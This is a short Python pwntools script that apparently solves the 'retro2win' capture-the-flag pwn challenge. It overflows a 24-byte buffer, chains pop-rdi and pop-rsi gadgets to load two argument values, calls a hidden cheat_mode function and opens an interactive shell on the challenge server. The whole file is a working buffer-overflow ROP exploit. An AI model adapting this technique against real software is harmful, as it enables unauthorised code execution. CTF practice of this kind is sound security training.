#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("retro2win")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("retro2win.ctf.intigriti.io", 1338)
    else:
        return process(elf.path)

# Plan:
# Call win function with correct argument values in rdi and rsi (2 args) using ropchain

# Addresses
pop_rdi_ret = 0x4009b3
pop_rsi_pop_r15_ret = 0x4009b1
cheat_mode = 0x400736

# cheat_mode args
# 1 :   0x2323232323232323
# 2:    0x4242424242424242

io = start()


io.recvuntil(b"Select an option:")
io.sendline(b"1337")

offset = b"A"*24
p = offset
p += p64(pop_rdi_ret)
p += p64(0x2323232323232323) # arg1
p += p64(pop_rsi_pop_r15_ret)
p += p64(0x4242424242424242) # arg2
p += p64(0) # fill r15 with garbage (I chose 0's)
p += p64(cheat_mode) # call function


io.recvuntil(b"Enter your cheatcode:")
io.sendline(p)

print(io.recvline(timeout=1)) # going to interactive immediately only works locally... gotta do som recvlines ;)
print(io.recvline(timeout=1)) # going to interactive immediately only works locally... gotta do som recvlines ;)
print(io.recvline(timeout=1)) # going to interactive immediately only works locally... gotta do som recvlines ;)
print(io.recvline(timeout=1)) # going to interactive immediately only works locally... gotta do som recvlines ;)
print(io.recvline(timeout=1)) # going to interactive immediately only works locally... gotta do som recvlines ;)
print(io.recvline(timeout=1)) # going to interactive immediately only works locally... gotta do som recvlines ;)


io.interactive()
